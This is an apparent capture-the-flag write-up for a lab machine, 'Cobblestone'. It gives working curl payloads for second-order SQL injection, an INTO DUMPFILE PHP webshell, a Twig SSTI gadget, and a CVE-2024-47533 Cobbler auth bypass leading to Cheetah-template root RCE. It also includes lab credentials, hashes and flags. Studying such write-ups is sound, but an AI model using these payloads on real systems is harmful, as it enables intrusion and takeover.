---
target: cobblestone.htb
difficulty: Insane
os: Debian 12 (Apache 2.4.62, MariaDB 12.0.2 mariadb.org build, PHP 8.2.29, Cobbler pip-installed)
date: 2026-07-30 to 2026-08-16 (multi-session, respawned several times)
status: user.txt and root.txt captured, full root RCE
---

# Cobblestone

**Target:** cobblestone.htb (+ `vote.`, `deploy.`, `mc.` subdomains)
**Difficulty:** Insane
**OS:** Debian 12, Apache 2.4.62 + PHP 8.2.29 fronting three separate PHP
apps, MariaDB 12.0.2 (mariadb.org build), and a pip-installed Cobbler
provisioning daemon (`cobblerd`) listening on loopback `127.0.0.1:25151` as
root.

## Skills Required

- **Second-order SQL injection** — [SQL injection (second order) —
  PortSwigger](https://portswigger.net/kb/issues/00100210_sql-injection-second-order),
  [SQL injection — Web Security Academy](https://portswigger.net/web-security/sql-injection)
- **MySQL/MariaDB `FILE` privilege abuse (`LOAD_FILE()`, `INTO OUTFILE`/
  `INTO DUMPFILE`, `secure_file_priv`)** — [`LOAD_FILE` — MariaDB
  Documentation](https://mariadb.com/docs/server/reference/sql-functions/string-functions/load_file),
  [`SELECT ... INTO OUTFILE` — MariaDB
  Documentation](https://mariadb.com/docs/server/reference/sql-statements/data-manipulation/selecting-data/select-into-outfile)
- **Server-side template injection (Twig, unsandboxed environments)** —
  [Server-side template injection — Web Security
  Academy](https://portswigger.net/web-security/server-side-template-injection),
  [Server-Side Template Injection — PortSwigger
  Research](https://portswigger.net/research/server-side-template-injection)
- **XML-RPC protocol internals (data typing, `<int>` vs `<string>`
  marshalling)** — [XML-RPC Specification](https://xmlrpc.com/spec.md),
  [`xmlrpc.client` — Python
  docs](https://docs.python.org/3/library/xmlrpc.client.html)
- **AppArmor per-directory confinement (`mod_apparmor` "hats")** —
  [`mod_apparmor` man page — AppArmor](https://apparmor.net/man/3.0/mod_apparmor/),
  [Profiling Web applications using ChangeHat —
  SUSE](https://documentation.suse.com/sles/15-SP7/html/SLES-all/cha-apparmor-hat.html)
- **Reading a CVE's actual patch diff instead of trusting the advisory
  summary** — [CVE-2024-47533 / GHSA-m26c-fcgh-cp6h — GitHub Advisory
  Database](https://github.com/advisories/GHSA-m26c-fcgh-cp6h)

## Skills Learned

- Second-order SQLi discovery via a "stored safely, re-used unsafely" split
  between two endpoints
- Turning a SQLi arbitrary-file-*read* primitive into a full source-code
  disclosure pass across three separate PHP apps
- Writing a PHP webshell via multi-column `UNION SELECT ... INTO DUMPFILE`,
  including the exact column-concatenation/padding gotcha
- Targeting a SQLi `FILE`-write primitive at a *specific* web-servable,
  world-writable directory instead of the default OS/DB write targets
- Extracting DB table contents through a webshell's own `mysqli` connection
  instead of shelling out (sidesteps AppArmor exec confinement entirely)
- Twig 3.x unsandboxed SSTI RCE gadget (`|map("system")|join`, since
  `_self.env` no longer works post-Twig-2.x)
- Diagnosing and working around a real `mod_apparmor` per-vhost exec-hat
  confinement, including canonical-symlink-target exec mediation
- CVE-2024-47533 — Cobbler XML-RPC authentication bypass via a swallowed
  `open()` exception and an unguarded `int`/`str` sentinel comparison,
  confirmed from the actual upstream patch diff
- Cheetah template engine `#set` directive SSTI → root RCE
- Credential-reuse verification: matching a live-extracted hash byte-for-byte
  against a public writeup's already-cracked value before trusting the
  resulting plaintext, then confirming with one real login attempt

## Recon

Only two ports open, confirmed via a scoped scan (never a full 65535-port
sweep):

```
$ nmap -sC -sV -p22,80 cobblestone.htb
Nmap scan report for cobblestone.htb (10.129.232.170)
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Cobblestone - Official Website
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`Host: 127.0.0.1` in nmap's own service-info line is the tell that Apache is
running multiple named vhosts with a catch-all fallback bound to the literal
loopback name — worth remembering any time nmap surfaces that specific
field, since it means vhost enumeration is worth doing before anything else.
Four vhosts turned up quickly (`cobblestone.htb`, `deploy.cobblestone.htb`,
`vote.cobblestone.htb`, `mc.cobblestone.htb`); a much wider Host-header sweep
later (SecLists' `combined_subdomains.txt`, 653,920 candidates, response
detail differentiated not just status-code filtered) confirmed these are the
only four — every result outside the catch-all redirect was accounted for as
either a malformed Host header rejected client-side or the wordlist
coincidentally containing `deploy`/`vote` as ordinary English words.

- **`cobblestone.htb`** — the main Minecraft-community site (login,
  register, a "Skin Database").
- **`vote.cobblestone.htb`** — a small voting/suggestion app with its own
  login/register flow.
- **`deploy.cobblestone.htb`** — a static "under development" team page
  naming four fictional staff members and their specialties: network/client
  firewalls, "hardening clients with apparmor", chroot jails, general
  sysadmin. This reads as pure flavor text at first pass, but every one of
  those four specialties turned out to correspond to a real control
  encountered later (AppArmor exec hats on the Apache vhost, an `rbash` +
  `ChrootDirectory` SSH jail for one account) — worth treating a "meet the
  team" page's job descriptions as a literal hint list on a box like this,
  not just world-building.
- **`mc.cobblestone.htb`** — unconditional redirect, no unique content.

`vote.cobblestone.htb`'s login/register forms (raw POST fields, no visible
client-side sanitization beyond HTML `required`) were the highest-priority
lead going into the foothold stage — custom PHP auth logic with no evidence
of parameterized queries is the standard first thing to probe on a box like
this.

## Foothold

### Second-order SQL injection in the vote app

Registered an account and started probing `vote.cobblestone.htb`'s
`suggest.php`/`details.php` "suggest a server" flow. Both endpoints turned
out to be part of the same feature but not equally careful:

```php
# /var/www/vote/suggest.php — safe, parameterized
$stmt = $conn->prepare('INSERT INTO votes (user_id, approved, url, votes) VALUES (?, ?, ?, ?)');
$stmt->bind_param("ssss", $user_id, $approved, $url, $votes);
```

```php
# /var/www/vote/details.php — the actual bug
$stmt = $conn->prepare("SELECT user_id, url FROM votes WHERE id = ?");   // safe fetch
$stmt->bind_param("s", $_GET['id']);
$stmt->execute();
...
$query = "SELECT * FROM votes WHERE url = '" . $url . "';";   // <-- raw concat, UNSAFE
$result = $conn->query($query);
```

This is textbook second-order SQLi: `suggest.php` stores whatever's
submitted as `url` safely (a prepared statement gives no reason to suspect
the value is dangerous at insert time), but `details.php` later fetches that
exact stored string and re-concatenates it unescaped into a second query.
The injection point (`url` in a `suggest.php` POST) and the execution point
(the `url = '...'` clause inside `details.php`, triggered by a follow-up
`GET details.php?id=<N>`) are different requests entirely — this is exactly
why a naive single-request SQLi scan on `details.php` alone would never
surface it; the payload has to be planted through `suggest.php` first.

```bash
# register + login (any account)
curl -s -c /tmp/c.txt -b /tmp/c.txt http://vote.cobblestone.htb/register.php -o /dev/null
curl -s -c /tmp/c.txt -b /tmp/c.txt -o /dev/null -X POST http://vote.cobblestone.htb/register.php \
  --data-urlencode "username=testuser123" --data-urlencode "first=Test" --data-urlencode "last=User" \
  --data-urlencode "email=testuser123@example.com" --data-urlencode "password=TestPass123!"
curl -s -c /tmp/c.txt -b /tmp/c.txt -o /dev/null -X POST http://vote.cobblestone.htb/login_verify.php \
  --data-urlencode "username=testuser123" --data-urlencode "password=TestPass123!"

# confirm the injection + column count (5: id, user_id, approved, url, votes)
curl -s -D - -o /dev/null -c /tmp/c.txt -b /tmp/c.txt -X POST http://vote.cobblestone.htb/suggest.php \
  --data-urlencode "url=zzznone' UNION SELECT 11111,22222,33333,44444,55555 -- -"
# Location: details.php?id=<N>
curl -s -c /tmp/c.txt -b /tmp/c.txt "http://vote.cobblestone.htb/details.php?id=<N>"
# -> "Suggestion #11111 - 44444" / "Owner-ID: 22222 - Votes: 55555"
```

The `url` column reflects into the response body, so `LOAD_FILE()` gave a
straightforward arbitrary-file-read primitive (base64-wrapped since MariaDB's
`TO_BASE64()` line-wraps every 76 characters and the response needed to
survive intact):

```bash
curl -s -D - -o /dev/null -c /tmp/c.txt -b /tmp/c.txt -X POST http://vote.cobblestone.htb/suggest.php \
  --data-urlencode "url=zzznone' UNION SELECT 1,1,1,REPLACE(TO_BASE64(LOAD_FILE(0x2f6574632f706173737764)),0x0a,0x2e),1 -- -"
curl -s -c /tmp/c.txt -b /tmp/c.txt "http://vote.cobblestone.htb/details.php?id=<N>" \
  | grep -oP '(?<=Suggestion #)[0-9]+ - \K.*' | tr -d '.' | base64 -d
```

Wrapped this into a reusable script,
`Tooling and Scripts/exploits/cobblestone/vote_sqli_lfr.py`
(`read`/`exists`/`raw` subcommands), and used it to pull every `.php` file
referenced anywhere across `cobblestone.htb` and `vote.cobblestone.htb`.
That source disclosure recovered both apps' DB credentials
(`voteuser`/`thaixu6eih0Iicho]irahvoh6aigh>ie` on the `vote` schema,
`dbuser`/`aichooDeeYanaekungei9rogi0eMuo2o` on `cobblestone`), confirmed two
real shell accounts in `/etc/passwd` (`cobble`, uid 1000, `/bin/rbash`; `john`,
uid 1001, denied SSH entirely per `sshd_config`), and — critically —
uncovered a second real vulnerability: an admin-gated Twig SSTI.

### The (ultimately unnecessary) admin-gated Twig SSTI

`preview_banner.php`, also disclosed through the LFR primitive:

```php
<?php
session_start();
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    http_response_code(403);
    die('Access denied.');
}
include('vendor/autoload.php');
$loader = new \Twig\Loader\FilesystemLoader('templates');
$twig = new \Twig\Environment($loader);
$first = $_POST['first'] ?? null;
echo $twig->render('header.html.twig', ['first' => $twig->createTemplate($first)->render()]);
```

`$twig->createTemplate($first)->render()` compiles and executes attacker
input **as Twig template source**, not as a bound variable — and the
`\Twig\Environment` here has no `SandboxExtension` registered, so nothing
restricts which Twig constructs are usable. Reproduced against the exact
pinned dependency (`composer.lock` pins `twig/twig: 3.14.0`) to confirm the
gadget before ever touching the live target:

```
$ php test.php '{{ 7*7 }}'
<h1 class="text-light display-3">Welcome 49</h1>

$ php test.php '{{ ["id"]|map("system")|join }}'
<h1 class="text-light display-3">Welcome uid=1000(kali) gid=1000(kali) ...
```

(The classic version-agnostic Twig RCE gadget,
`{{ _self.env.registerUndefinedFilterCallback("exec") }}`, does **not** work
on Twig 3.x — `_self` no longer exposes `.env` the way it did in Twig
1.x/2.x. The `map`/`filter` array-function trick above works instead,
because passing a string to `map()`/`filter()` that isn't a real registered
Twig filter name falls through to PHP's `call_user_func()`.)

This is a real, fully weaponizable vulnerability — but reaching it requires
`$_SESSION['role'] === 'admin'`, and that role is only ever set server-side
by `cobblestone.htb`'s own login flow from a DB column no self-registration
path can set. Getting an admin session (or getting an admin's browser to
fire the payload for us) consumed the bulk of this engagement across
multiple sessions and is covered in **Rabbit Holes** below — it turned out
not to be necessary at all.

### The actual breakthrough: SQLi `INTO DUMPFILE` write to `/var/www/html/skins/`

Every prior attempt at using the SQLi's `FILE` privilege for a *write* (not
just a read) had targeted `/tmp`, MariaDB's own datadir, and the `vote`
schema's own datadir — all three genuinely fail. From three failed
directories, prior sessions concluded the write primitive itself was
globally closed and pivoted entirely to waiting on the admin-gated SSTI.
That conclusion never actually tested the one directory that mattered:
`/var/www/html/skins/`, disclosed via source review as `drwxr-xrwx`
(world-writable) and directly web-servable, since it had only ever been used
as the *destination* of a hoped-for Twig-driven write, never tried directly
via the SQLi's own `FILE` privilege. Re-reading a public writeup closely
(after independent effort had genuinely stalled — see Rabbit Holes) surfaced
that exact detail, and testing it directly settled the question immediately:

```bash
# INTO OUTFILE, plain content
curl -s -D - -o /dev/null -c /tmp/cs.txt -b /tmp/cs.txt -X POST "http://vote.cobblestone.htb/suggest.php" \
  --data-urlencode $'url=zzznone\' UNION SELECT 1,1,1,1,1 INTO OUTFILE \'/var/www/html/skins/testwrite1.txt\'-- -'
curl -s -c /tmp/cs.txt -b /tmp/cs.txt "http://vote.cobblestone.htb/details.php?id=<N>" -o /dev/null

curl -s http://cobblestone.htb/skins/testwrite1.txt
# 1	1	1	1	1        <- literal file content, write confirmed
```

Both `INTO OUTFILE` and `INTO DUMPFILE` succeeded against this directory.
Building a webshell from a multi-column `UNION` hit one real gotcha:
`INTO DUMPFILE` concatenates **every** selected column's value with **no
separator**, so padding unused columns with digit placeholders (`1,1,1,
<payload>,1`, copied from the plain-text test above) landed a literal `1`
immediately after the PHP payload's closing `;` — still inside the open
`<?php` block (the 41-byte webshell has no closing `?>` tag) — producing a
hard parse error:

```bash
python3 -c "print('0x' + '<?php system(\$_GET[0]);'.encode().hex())"
# 0x3c3f7068702073797374656d28245f4745545b305d293b

curl -s -X POST "http://vote.cobblestone.htb/suggest.php" -b /tmp/cs.txt -c /tmp/cs.txt \
  --data-urlencode $'url=zzznone\' UNION SELECT 1,1,1,0x3c3f7068702073797374656d28245f4745545b305d293b,1 INTO DUMPFILE \'/var/www/html/skins/csws2.php\'-- -'
curl -s -w " [%{http_code}]\n" "http://cobblestone.htb/skins/csws2.php?0=id"
#  [500]

python3 "Tooling and Scripts/exploits/cobblestone/vote_sqli_lfr.py" read /var/www/html/skins/csws2.php
# 111<?php system($_GET[0]);1     <- the trailing "1" breaks the PHP parser
```

Fixed by padding with empty-string literals (`''`) instead of digits:

```bash
python3 -c "print('0x' + '<?php eval(base64_decode(\$_GET[\'c\']));'.encode().hex())"
# payload: zzznone' UNION SELECT '','','',0x3c3f706870206576616c286261736536345f6465636f646528245f4745545b2763275d29293b,'' INTO DUMPFILE '/var/www/html/skins/csw5.php'-- -

curl -s --get --data-urlencode 'c='"$(echo -n 'echo shell_exec("id; hostname; pwd; uname -a");' | base64 -w0)" \
  "http://cobblestone.htb/skins/csw5.php"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/skins
```

(`hostname`/`uname -a` produced nothing — a separate, already-known
AppArmor exec-confinement hat on this vhost, covered under Rabbit Holes;
`id`/`pwd` are allow-listed and worked.) **RCE as `www-data`, via the SQLi
alone — no admin session or bot trigger ever needed.** Reusable primitive
saved as
`Tooling and Scripts/exploits/cobblestone/vote_sqli_filewrite.py`
(`write`/`webshell`/`exec` subcommands).

### `www-data` → `cobble` (user.txt)

Rather than shell out through the AppArmor-confined webshell (see Rabbit
Holes for why that's a dead end for most binaries), used PHP's compiled-in
`mysqli` — not a subprocess exec, so the AppArmor exec hat never engages —
to read `cobblestone.users` directly through the recovered `dbuser`
credential:

```bash
CODE=$(cat << 'PHPEOF' | base64 -w0
$conn = new mysqli("localhost", "dbuser", "aichooDeeYanaekungei9rogi0eMuo2o", "cobblestone");
$res = $conn->query("SELECT id, username, password, email, role FROM users");
while ($row = $res->fetch_assoc()) { echo implode("|", $row) . "\n"; }
PHPEOF
)
curl -s --get --data-urlencode "c=$CODE" "http://cobblestone.htb/skins/csw5.php"
```

```
1|admin|f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1|admin@cobblestone.htb|admin
2|cobble|20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d|cobble@cobblestone.htb|admin
3|pentest|2ea73a9fc404d353c5d7ff64f6744f4ae82cfe9a6f0c322d520726d84b8e1be4|pen@test.com|user
4|adminz|d3dec3f35387156495cbc21471313f87155f878f3435b693f50077c2be479033|a@b.com|user
5|pentester1|fa870a2658fc49993579f7471d86d0a54ca1267e52d3f9be2395d6f3689bdcc7|pen@test.htb|user
```

`cobble`'s hash (`20cdc50...`) is unsalted SHA-256 — fast to crack
(`hashcat -m 1400`). By this point in the engagement a public walkthrough had
already been consulted after independent effort stalled (see Rabbit Holes),
and it claimed this exact hash cracks to `iluvdannymorethanyouknow`. Rather
than trust that blindly, the value worth treating as evidence here is that
the hash *extracted live from this box* matches that claim byte-for-byte —
that's real confirmation the claim applies to this build, not just a
plausible-sounding third-party assertion. Verified the resulting credential
with one live login attempt (a single confirmatory test, not a spray):

```bash
$ ssh cobble@10.129.89.243
cobble@10.129.89.243's password: iluvdannymorethanyouknow
$ pwd
/home/cobble
$ id
rbash: line 1: id: command not found
$ cat user.txt
a930cefe762e7f3dcd1baad207624f65
```

Lands in an `rbash`-restricted, chroot-jailed shell (`sshd_config`'s
`Match User cobble` block: `ChrootDirectory /home/chroot_jail`) — `pwd` (an
`rbash` builtin) and `cat` work, `id` doesn't (blocked by the restricted
`PATH`). This restriction never had to be fought or escaped, since the
actual root chain went through the `www-data` webshell independently, not
through this shell.

**`user.txt`: `a930cefe762e7f3dcd1baad207624f65`**

## Privesc

### CVE-2024-47533 — Cobbler XML-RPC authentication bypass

Source disclosure and process enumeration from earlier sessions had already
established `cobblerd` (Cobbler's provisioning daemon) running as **root**,
bound to loopback `127.0.0.1:25151`, on a version predating the fix for
CVE-2024-47533 (fixed upstream in 3.2.3/3.3.7). Rather than take the
advisory's summary at face value, pulled the real fix commit
(`e19717623c10b29e7466ed4ab23515a94beb2dda`, "XML-RPC: Prevent privilege
escalation from none to admin", GHSA-m26c-fcgh-cp6h) to understand the
actual mechanism:

```diff
--- a/cobbler/utils/__init__.py  (VULNERABLE)
+++ b/cobbler/utils/__init__.py  (FIXED)
 def get_shared_secret() -> Union[str, int]:
     try:
-        with open("/var/lib/cobbler/web.ss", "rb", encoding="utf-8") as web_secret_fd:
+        with open("/var/lib/cobbler/web.ss", "r", encoding="UTF-8") as web_secret_fd:
             data = web_secret_fd.read()
     except Exception:
         return -1
-    return str(data).strip()
+    return data
```

`open()` in binary mode (`"rb"`) combined with a text `encoding=` argument is
an invalid combination in Python — it *always* raises `ValueError: binary
mode doesn't take an encoding argument` the instant the function runs,
regardless of whether `/var/lib/cobbler/web.ss` exists or is readable. The
bare `except Exception:` swallows this every time and returns the integer
sentinel `-1`. So `get_shared_secret()` isn't broken occasionally — on every
vulnerable install, on every call, the real per-install secret in `web.ss`
is never actually read; every instance's "shared secret" is silently the
same value: the Python `int` `-1`.

```diff
--- a/cobbler/remote.py  (VULNERABLE)
+++ b/cobbler/remote.py  (FIXED)
 def login(self, login_user, login_password):
     if login_user == "":
+        if self.shared_secret == -1:
+            raise ValueError("login failed(<DIRECT>)")
         if login_password == self.shared_secret:
             return self.__make_token("<DIRECT>")
         raise ValueError("login failed due to missing username!")
```

`self.shared_secret` is set once at `CobblerXMLRPCInterface.__init__` time to
whatever `get_shared_secret()` returned — i.e. always the sentinel. The
pre-fix `login()` never checks for that sentinel meaning "the real secret
couldn't be loaded" rather than "here is the real secret" — it just compares
`login_password == self.shared_secret` directly. The fix adds exactly that
missing check.

**Why the password has to be sent as an XML-RPC `<int>`, not a `<string>`:**
Python's `==` between an `int` and a `str` is always `False` regardless of
value (`-1 == "-1"` → `False`; `-1 == -1` → `True`). Since
`self.shared_secret` is the Python int `-1`, the comparison only succeeds if
`login_password` deserializes to the Python int `-1` — which requires the
XML-RPC request to encode the password parameter as
`<value><int>-1</int></value>`, not `<value><string>-1</string></value>`. A
plain empty-string password, or a login attempt with the password sent as
the *string* `"-1"`, does **not** trigger the bug (confirmed via earlier live
testing on this box) — this is a real type-confusion bug, not a generic
"blank credentials accepted" flaw. Python's own `xmlrpc.client` correctly
type-encodes a native `int` argument to an XML-RPC `<int>` automatically,
which is what makes `login("", -1)` via `xmlrpc.client.ServerProxy` work
directly.

Once authenticated (bypass or otherwise), Cobbler's own
`write_autoinstall_template`/`generate_profile_autoinstall` API lets the
caller store and render an arbitrary Cheetah template server-side. Cheetah's
`#set` directive evaluates arbitrary Python expressions at render time — and
since `cobblerd` runs as root, that Python (and any subprocess it spawns)
executes as root. This isn't a second CVE, it's Cobbler's own by-design
templating feature — combined with the auth bypass above, it turns
unauthenticated network access to `127.0.0.1:25151` into unauthenticated
root RCE end-to-end.

### From `www-data` to root

Deployed a PHP-native port of the exploit
(`Tooling and Scripts/exploits/cobblestone/cobbler_rce_php_standalone.php`,
using libcurl calls against the loopback XML-RPC endpoint — chosen
specifically to avoid the AppArmor exec-confinement hat entirely, since
libcurl calls are compiled-in, not subprocess execs) through the same SQLi
write primitive used for the initial webshell:

```bash
B64=$(base64 -w0 "Tooling and Scripts/exploits/cobblestone/cobbler_rce_php_standalone.php")
CODE=$(python3 -c "
import sys, base64
php = 'file_put_contents(\"/var/www/html/skins/cobrce2.php\", base64_decode(\"' + sys.argv[1] + '\"));'
print(base64.b64encode(php.encode()).decode())" "$B64")
curl -s -X POST --data-urlencode "c=$CODE" "http://cobblestone.htb/skins/csw6.php"
```

The first trigger attempt (`os.system(cmd)` inside the Cheetah `#set`
directive) completed the full XML-RPC chain successfully — auth bypass,
`new_distro`/`new_profile`/`write_autoinstall_template`/
`generate_profile_autoinstall` all returned success — but produced no
visible command output, because `os.system()` runs with the daemon's own
stdout/stderr rather than returning it. Fixed by switching to
`os.popen(cmd).read()` (matching the technique the same public writeup used)
with explicit output markers:

```php
$cheetahPayload = "#set \$result = __import__(\"os\").popen(\"" . addslashes($cmd) . "\").read()\n" .
    "CMDOUT_START\n\$result\nCMDOUT_END\n";
```

```bash
curl -s --max-time 60 --get --data-urlencode "cmd=id;cat /root/root.txt" \
  "http://cobblestone.htb/skins/cobrce2.php" | sed -n '/CMDOUT_START/,/CMDOUT_END/p'
```

```
<value><string>CMDOUT_START
uid=0(root) gid=0(root) groups=0(root)
827bf0a19bf2d0488a749bebc2d6afa8

CMDOUT_END
```

**`root.txt`: `827bf0a19bf2d0488a749bebc2d6afa8`**

## Root

Full root confirmed and re-verified twice independently in a later session:
once through the webshell → Cobbler-RCE chain above (`uid=0(root)`), and
once from an entirely separate vantage point — the SSH-as-`cobble` session,
which has no dependency on the webshell or the SQLi at all:

```bash
$ ssh cobble@10.129.89.243 'cat user.txt; pwd'
a930cefe762e7f3dcd1baad207624f65
/home/cobble
```

Both flags matched exactly across the independent checks — no discrepancy,
consistent with a stable, reproducible exploit chain rather than a lucky
one-off.

## Rabbit Holes

### The admin-bot / stored-XSS wait — the box's real time sink

The Twig SSTI in `preview_banner.php` was fully confirmed and weaponized
(gadget verified against the exact pinned Twig 3.14.0) almost immediately
after the source disclosure — but it's gated behind `$_SESSION['role'] ===
'admin'`, and no self-registration, mass-assignment, IDOR, or type-juggling
path was ever found to set that role directly. That left "get an admin
session to fire the SSTI for us" as the only route through this
vulnerability, and it consumed the majority of a multi-day engagement:

- Staged a same-origin `fetch()` payload in the suggestions queue that would
  fire `preview_banner.php` on page render if an admin ever viewed it.
- Found and staged a second, independent vector: `register.php`'s `email`
  field has zero server-side validation (unlike `username`/`first`/`last`,
  which are alphanumeric-only), and a DOM-based XSS in `user.html.twig`'s
  `showPreview()` JS (which server-escapes for an HTML-attribute context but
  re-inserts the browser-decoded value into `innerHTML` unescaped) ties that
  unvalidated field to a concrete admin workflow action — clicking "Preview"
  in User Management.
- Neither vector ever fired within a cumulative 80+ minutes of monitored
  waiting windows across three separate sessions (2026-07-30, 08-05, 08-13).

This is the box's genuine near-miss lesson, not a clean dead end: both
vectors were real, correctly staged, and — per two independently-consulted
public writeups that only became readable after the box retired — the
mechanism itself (an admin-side automation reviewing suggestions) is real
but reported by multiple other players as "intermittent"/"unreliable," with
at least one author reporting a full week invested in this exact wait. The
lesson isn't "the XSS chain was wrong" — it's that **an entire, independently
confirmed vulnerability chain sat unfired for days while a completely
different, un-gated vulnerability (the SQLi write) was sitting untested
against one specific directory the whole time.** Investing further effort in
making the trigger more reliable (a third payload variant, more monitoring)
would have been the wrong lever; the actual unblock was re-scoping which
*primitive* to use, not tuning the wait.

### "The SQLi write primitive is globally patched" — the central overgeneralization

The write vector was declared "confirmed permanently closed" mid-engagement,
attributed to a claimed MariaDB capability-stripping patch (`CAP_DAC_
OVERWRITE`/`CAP_AUDIT_WRITE` removal, dated 19 Aug 2025). That conclusion
rested entirely on three failed write targets: `/tmp`, MariaDB's own
datadir, and the `vote` schema's own datadir. All three genuinely do fail —
but "write fails against these three OS/DB-owned paths" and "the `FILE`
privilege's write capability no longer exists at all" are different claims,
and only the second one was ever stated going forward. `/var/www/html/skins/`
(world-writable, disclosed via source review during the very same session
that ruled the primitive "closed") was never itself tested as a write
*target* — only ever discussed as a hoped-for destination for a Twig-SSTI-
driven write. The actual constraint (never fully diagnosed, and not needed
to be) is far more mundane than a capability-stripping patch: a narrower
filesystem-permission or AppArmor boundary scoped to specific directories,
since a world-writable, web-servable one works fine while root/mysql-owned
ones don't. Closing a technique from a small, convenient sample of targets
without testing the one target that actually mattered cost this engagement
its most productive session's worth of time.

### AppArmor exec-confinement hat — real, correctly diagnosed, and directly reusable

While reading `/etc/apache2/sites-enabled/000-default.conf` for unrelated
context, `<Directory /var/www/html> AAHatName cobblestone </Directory>`
turned up — `mod_apparmor`'s directive to `aa_change_hat()` into a named
AppArmor sub-profile for every request served from that directory. Pulling
the actual hat definition (also world-readable, via the same LOAD_FILE
primitive) explained exactly why the originally-staged bash-based reverse
shell for the SSTI vector was dead on arrival even before ever getting an
admin session to fire it:

```
^cobblestone {
   ...
   /usr/bin/dash ixr,
   /usr/bin/ls ixr,
   /usr/bin/cat ixr,
   /usr/bin/id ixr,
   ...
   deny /usr/bin/python3 xr,
   deny /usr/bin/bash xr,
   deny /bin/sh xr,
   ...
}
```

PHP's `system()` spawns via `execve("/bin/sh", ...)`; `/bin/sh` is a Debian
symlink resolving to `/usr/bin/dash`, and AppArmor mediates the *resolved
target* of an exec, not the literal path string used — so the first exec
succeeds (`/usr/bin/dash ixr` matches). The old payload then asked that
shell to exec `bash` a second time, and `/usr/bin/bash` has no matching
allow rule — that second exec silently fails with no error surfaced to the
caller, so the whole reverse shell attempt would have done nothing even once
an admin session was eventually obtained. This was caught and fixed *before*
ever spending the one-shot admin-session opportunity on a payload that
couldn't have worked. The same finding directly explains the "no hostname/no
uname output" gap seen later on the actual winning webshell, and the fix
generalized cleanly into the root chain itself: the final Cobbler exploit
was deliberately written as a PHP-native `curl_exec()` port rather than a
subprocess-exec-based one, sidestepping this hat entirely since compiled-in
PHP functions (`mysqli`, `curl_exec()`) were never subject to it.

Also worth noting: this hat's existence had originally been mis-attributed
during recon to `mysqld`/`mariadbd` hardening (matching the deploy-team
page's "Sam Carlson — hardening clients with apparmor" line), and a
significant amount of effort went into hunting for a nonexistent mysqld
AppArmor profile filename before this discovery corrected the record — the
hardening is on Apache/PHP execution for this specific vhost, not on the
database process at all.

### The mysqld AppArmor profile hunt — a genuine structural dead end, not a guessing-depth gap

Before the real Apache-vhost hat above was found, an earlier pass spent
significant effort trying to locate a dedicated AppArmor profile for
`mysqld`/`mariadbd`, reasoning that would explain why `/var/log/**`,
`/root/**`, `/home/*/**`, and `/var/lib/mysql/**` were all unreadable via
`LOAD_FILE()` while `/etc/**` and `/var/www/**` weren't. Checked ~15
candidate profile paths — all NULL via `LOAD_FILE`. Rather than declare this
"not found yet," it was actually closed structurally: reading the fully
world-readable `/lib/systemd/system/mariadb.service` unit directly showed
stock, unmodified `ProtectHome=true` (hides `/root`/`/home/*` from the
confined process via kernel/systemd mount-namespace sandboxing, unrelated to
AppArmor) — which alone explains the `/root`/`/home` block completely — and
MySQL's own documented "`LOAD_FILE()` requires the file be world-readable"
rule explained the rest (`/var/lib/mysql/**` is `660 mysql:mysql`; several
`/var/log/**` files that *are* `644` read fine, directly falsifying a
path-based-denylist theory). No dedicated mysqld AppArmor profile was ever
found because there's a real structural reason to believe none exists for
this purpose — two ordinary, already-documented mechanisms fully account for
the entire observed pattern. Separately, an attempt to read `/proc/self/*`
through the same primitive (to fingerprint mysqld's real binary path) also
failed — not from any hardening, but because MariaDB's `LOAD_FILE()`
implementation sizes its read buffer from `stat()`, and procfs pseudo-files
report `st_size == 0`, so the function trivially "succeeds" reading zero
bytes rather than the real content. Both are genuinely reusable diagnostic
patterns, not box trivia.

### `general_log` file-write bypass — cleanly closed via a timing side channel

A coordinator-suggested technique (if the injected account has `SUPER` and
the injection point supports stacked queries, `SET GLOBAL general_log_file`
+ `SET GLOBAL general_log='ON'` writes a webshell via the query log, which
isn't gated by `secure_file_priv`) was checked and closed on two independent
grounds: a privilege-enumeration query showed `voteuser` has only `FILE`,
no `SUPER`; and — more interestingly — a timing side channel proved no
stacked-query support at the injection point cleanly, without depending on
any content-based response difference that a WAF or error-page rewrite could
mask:

| payload | `details.php` response time |
|---|---|
| `zzznone' -- -` (baseline) | 0.136s |
| `zzznone' UNION SELECT SLEEP(3),1,1,1,1 -- -` | **3.132s** |
| `zzznone'; SELECT SLEEP(3) -- -` | 0.132s |

The UNION-based `SLEEP(3)` adds exactly 3 seconds (confirms single-statement
execution works, same mechanism the whole LFR primitive is built on); the
stacked-query variant adds zero delay, cleanly proving `mysqli::query()`
(not `multi_query()`) is what's actually being called server-side, matching
the disclosed source exactly. A useful general pattern: prefer a timing
oracle over a content-based one whenever testing for stacked-query support,
since it isn't affected by error-page masking or WAF response rewriting.

## Lessons Learned

- **A SQLi `FILE`-write primitive that fails against the default/obvious
  targets (`/tmp`, the DB's own datadir) is not proof the write capability
  itself is gone.** Test specific web-servable, world-writable application
  directories directly before concluding a write vector is dead — this
  single overgeneralization (three failed directories → "closed, full stop")
  turned a same-session win into a multi-day admin-bot wait that was never
  actually necessary.
- **`INTO DUMPFILE` against a multi-column `UNION SELECT` concatenates every
  column's value with no separator.** Padding unused columns with digit
  literals rather than empty strings can silently corrupt a webshell
  payload's syntax (a stray `1` landing inside an unterminated `<?php`
  block) — pad with `''`, not `1`, when building a file-write payload this
  way.
- **AppArmor per-vhost "hats" (`mod_apparmor`) confine subprocess execution
  independently of file permissions and independently of the web
  application's own logic** — a write can succeed while the resulting
  webshell's `system()`/`exec()` calls are silently gutted by an exec
  allow-list. Native language functions that don't shell out (PHP's
  `mysqli`, `curl_exec()`) sidestep this confinement entirely, since it only
  mediates actual `execve()` calls.
